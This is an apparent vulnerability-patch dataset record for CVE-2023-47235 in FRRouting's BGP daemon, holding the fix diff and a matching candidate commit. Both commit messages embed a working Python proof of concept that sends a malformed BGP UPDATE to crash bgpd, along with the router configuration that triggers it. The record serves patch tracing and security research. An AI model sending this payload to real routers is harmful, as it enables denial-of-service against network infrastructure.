{
  "cve_id": "CVE-2023-47235",
  "cve_desc": "An issue was discovered in FRRouting FRR through 9.0.1. A crash can occur when a malformed BGP UPDATE message with an EOR is processed, because the presence of EOR does not lead to a treat-as-withdraw outcome.",
  "repo": "FRRouting/frr",
  "patch_hash": "6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
  "patch_info": {
    "commit_hash": "6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
    "repo": "FRRouting/frr",
    "commit_url": "https://github.com/FRRouting/frr/pull/14716/commits/6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
    "files": [
      "bgpd/bgp_attr.c"
    ],
    "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
    "before_after_code_files": [
      "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
    ]
  },
  "patch_diff": {
    "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
      "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "3391:  uint8_t type = 0;",
      "3395:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
      "3396:      !length)",
      "3400:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
      "",
      "[Removed Lines]",
      "3397:   return BGP_ATTR_PARSE_PROCEED;",
      "",
      "[Added Lines]",
      "3400:   return BGP_ATTR_PARSE_WITHDRAW;",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "3889:  aspath_unintern(&as4_path);",
      "3891:  transit = bgp_attr_get_transit(attr);",
      "3894:   if (transit)",
      "3895:    bgp_attr_set_transit(attr, transit_intern(transit));",
      "",
      "[Removed Lines]",
      "3892:  if (ret != BGP_ATTR_PARSE_ERROR) {",
      "",
      "[Added Lines]",
      "3901:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "01f232c227e566fec924472eb61cd6489a6e1d2b",
      "candidate_info": {
        "commit_hash": "01f232c227e566fec924472eb61cd6489a6e1d2b",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/01f232c227e566fec924472eb61cd6489a6e1d2b",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3406:  uint8_t type = 0;",
          "3410:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3411:      !length)",
          "3415:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
          "",
          "[Removed Lines]",
          "3412:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Added Lines]",
          "3415:   return BGP_ATTR_PARSE_WITHDRAW;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3839:  aspath_unintern(&as4_path);",
          "3841:  transit = bgp_attr_get_transit(attr);",
          "3844:   if (transit)",
          "3845:    bgp_attr_set_transit(attr, transit_intern(transit));",
          "",
          "[Removed Lines]",
          "3842:  if (ret != BGP_ATTR_PARSE_ERROR) {",
          "",
          "[Added Lines]",
          "3851:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
          "",
          "---------------"
        ]
      }
    }
  ]
}